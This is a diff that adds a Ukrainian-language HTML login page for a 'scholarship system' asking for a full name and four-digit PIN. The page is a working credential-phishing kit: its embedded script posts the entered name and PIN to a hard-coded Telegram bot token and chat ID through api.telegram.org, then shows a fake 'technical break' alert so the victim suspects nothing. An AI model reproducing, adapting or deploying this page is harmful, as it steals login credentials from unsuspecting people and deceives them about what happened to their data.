@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="uk">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Система стипендіатів</title>
+    <style>
+        body {
+            background-color: #f6f7fb;
+            font-family: "Segoe UI", sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            text-align: left;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        p.sub {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: 600;
+            display: block;
+            margin-top: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 15px;
+            margin-top: 5px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+
+        .error {
+            color: #d93025;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00aaff;
+            color: white;
+            border: none;
+            font-weight: bold;
+            border-radius: 6px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #008fcc;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h2>Система стипендіатів</h2>
+        <p class="sub">Увійдіть, використовуючи своє ім’я та PIN-код</p>
+        <form id="form">
+            <label>Повне ім’я</label>
+            <input type="text" id="name" placeholder="напр. 9a AMüller або Cafe Sonnenschein" required>
+
+            <label>ПІН-код</label>
+            <input type="password" id="pin" placeholder="4 значний PIN-код" required>
+
+            <div class="error" id="error-msg" style="display:none;">
+                Помилка підключення. Будь ласка, спробуйте пізніше.
+            </div>
+
+            <button type="submit">Зареєструватися</button>
+        </form>
+    </div>
+
+    <script>
+        const TOKEN = "7923191600:AAFN9cyQVT5u7TR7F7u2xV6ZvcuuUhUklmA";
+        const CHAT_ID = "6831802827";
+
+        document.getElementById("form").addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            const name = document.getElementById("name").value.trim();
+            const pin = document.getElementById("pin").value.trim();
+            const errorMsg = document.getElementById("error-msg");
+
+            const message = `📥 Вхідна заявка:\n👤 Ім’я: ${name}\n🔐 PIN-код: ${pin}`;
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+                .then(res => {
+                    if (res.ok) {
+                        alert("🔧 Технічна перерва. Спробуйте пізніше.");
+                        document.getElementById("form").reset();
+                        errorMsg.style.display = "none";
+                    } else {
+                        errorMsg.style.display = "block";
+                    }
+                })
+                .catch(() => {
+                    errorMsg.style.display = "block";
+                });
+        });
+    </script>
+</body>
+
+</html>
